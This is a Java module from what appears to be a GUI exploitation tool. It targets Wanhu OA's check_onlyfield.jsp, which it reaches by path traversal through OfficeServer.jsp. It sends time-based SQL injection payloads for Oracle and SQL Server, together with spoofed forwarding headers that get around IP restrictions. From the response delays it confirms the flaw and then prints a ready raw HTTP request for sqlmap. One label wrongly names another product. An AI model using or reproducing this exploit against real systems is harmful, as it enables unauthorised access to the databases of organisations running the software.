package exp.oa.wanhuoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools_getTime;

import java.util.HashMap;

public class wanhu_onlyfield_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("X-Forwarded-For","127.0.0.1");
            head.put("X-Originating-IP","127.0.0.1");
            head.put("X-Remote-Addr","127.0.0.1");
            head.put("X-Remote-IP","127.0.0.1");
            long var = HttpTools_getTime.get(url + "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)+AND+9632=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(65)||CHR(109)||CHR(70),3)+AND+(4917=4917" , head, "utf-8");
            long var2 = HttpTools_getTime.get(url + "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1);WAITFOR+DELAY+'0:0:3'--" , head, "utf-8");
            if (var > 3000 && var2 <3000) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_grpu8_operOriztion_sqli ]");
                    textArea.appendText("\n (1) 利用sqlmap模块进行利用,注入类型:延时注入,sql:oracle");
                    textArea.appendText("\n");
                });

                String target_req = "GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)+AND+9632=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(65)||CHR(109)||CHR(70),3)+AND+(4917=4917 HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0\n" +
                        "Accept: */*\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Accept-Language: zh-CN,zh;\n" +
                        "Connection: close\n" +
                        "X-Forwarded-For: 127.0.0.1\n" +
                        "X-Originating-IP: 127.0.0.1\n" +
                        "X-Remote-Addr: 127.0.0.1\n" +
                        "X-Remote-IP: 127.0.0.1";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else if (var < 3000 && var2 >3000) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ wanhu_onlyfield_sqli ]");
                    textArea.appendText("\n (1) 利用sqlmap模块进行利用,注入类型:延时注入,sql:sql server");
                    textArea.appendText("\n");
                });

                String target_req = "GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1);WAITFOR+DELAY+'0:0:3'-- HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0\n" +
                        "Accept: */*\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Accept-Language: zh-CN,zh;\n" +
                        "Connection: close\n" +
                        "X-Forwarded-For: 127.0.0.1\n" +
                        "X-Originating-IP: 127.0.0.1\n" +
                        "X-Remote-Addr: 127.0.0.1\n" +
                        "X-Remote-IP: 127.0.0.1";
                Platform.runLater(() -> {
                    textArea_cmd.appendText(target_req+"" +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var2+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            }else{

                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
